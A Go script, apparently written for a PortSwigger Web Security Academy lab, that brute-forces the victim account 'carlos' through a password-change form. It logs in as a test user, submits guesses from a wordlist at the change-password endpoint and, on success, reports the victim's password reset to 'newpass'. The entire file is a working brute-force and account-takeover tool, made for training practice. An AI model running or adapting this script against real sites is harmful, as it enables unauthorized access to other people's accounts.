//Creator Oier Zalba 
//Date 10/12/2022
//Burpsuite intruder alternative
//Scritp example for "Password brute-force via password change" portswigger lab
//Edit the loop as you wish

package main

import (
  "fmt"
  "net/http"
  "net/http/cookiejar"
  "sync"
  "log"
  "io/ioutil"
  "bytes"
  "os"
  "math"
  "time"
  "strings"
)

//Insert your url
var url = "https://0a4d00d704c45596c243b9b4001800a6.web-security-academy.net/"
var url2 string
//Miliseconds to wait every 10 querys, increase if the server doesn't handle it
var miliseconds = 200

var username = "wiener" 
var password = "peter"
var victim = "carlos"
var newpassword = "newpass"



//Goroutine to create concurrency
func save_page_to_html( s string, wg *sync.WaitGroup) (int) { 
   
   //Init cookiejar
   jar, err := cookiejar.New(nil)
	if err != nil {
		log.Fatalf("Error while creating cookie jar %s", err.Error())
	}
   
   //Init client without redirection (302), and with cookies
   client := &http.Client{
      CheckRedirect: func(req *http.Request, via []*http.Request) error {
         return http.ErrUseLastResponse
      },
      Jar: jar,
   }
   
   
   
   
   
   
   
   //GET1 gets the first cookie
   req, err := http.NewRequest(http.MethodGet, url,nil)
   if err != nil {
       log.Fatalf("Got error %s", err.Error())
   }

   resp, err := client.Do(req)
   if err != nil {
      log.Fatalf("An Error Occured %v", err)
   }
   defer resp.Body.Close()
     
   session := string(resp.Header.Get("Set-Cookie"))[8:40]
   

   
   
   
   
   
   
   
   
   
   //POST1 posts username and password to obtain second cookie after login
   str := "username="+username+"&password="+password
   jsonBody := []byte(str)
   bodyReader := bytes.NewReader(jsonBody)
   
   req, err = http.NewRequest(http.MethodPost, url, bodyReader)
   if err != nil {
    log.Fatalf("Got error %s", err.Error())
   }
   
   //sets first cookie
   cookie := &http.Cookie{
	    Name:   "session",
	    Value:  session,
	    MaxAge: 300,
    }
   req.AddCookie(cookie)
   
   resp, err = client.Do(req)
   if err != nil {
      log.Fatalf("An Error Occured %v", err)
   }
   defer resp.Body.Close()
   
   //gets second cookie
   session = string(resp.Header.Get("Set-Cookie"))[8:40]
   
    
    
    
    
    
    //POST2 sends second cookie and user and pass
   str = "username="+victim+"&current-password="+s+"&new-password-1="+newpassword+"&new-password-2="+newpassword
   //fmt.Println(str)
   jsonBody = []byte(str)
   bodyReader = bytes.NewReader(jsonBody)

   req, err = http.NewRequest(http.MethodPost, url2, bodyReader)
   if err != nil {
    log.Fatalf("Got error %s", err.Error())
   }
   
   //sets second cookie
   req.AddCookie(cookie)
   
   resp, err = client.Do(req)
   if err != nil {
      log.Fatalf("An Error Occured %v", err)
   }
   defer resp.Body.Close()
   
   fmt.Println("Password:",s,"Status code:", resp.StatusCode,"Lenght response:", string(resp.Header.Get("Content-Length")))
   
   //The stop signal
   if resp.StatusCode == 200{
       fmt.Println("*************************************************")
       fmt.Println("Stop signal send, password found")
       fmt.Println("The password has been reset succesfully, now you can log in with "+victim+":"+newpassword)
       
       os.Exit(1)
   }
    
   

   wg.Done()
   return resp.StatusCode
}

func main() {
    
    url2 = url+"my-account/change-password"
    url = url+"login"   
    
    content, err := ioutil.ReadFile("password.txt")

    if err != nil {
         log.Fatal(err)
    }
    
    content2 := string(content)
    partes := strings.Split(content2,"\n")

    var wg sync.WaitGroup //Manage goroutines
    
    //Loop
    for i := 0; i < 100; i++ {
        
     wg.Add(1)

     s := partes[i]
          
     save_page_to_html(s, &wg)
     
      //Timeout to dont saturate de server
      if math.Mod(float64(i),10) == 9{
         time.Sleep(time.Millisecond * time.Duration(miliseconds))
      }

        
    }
    
    wg.Wait()
    fmt.Println("Finished")

}
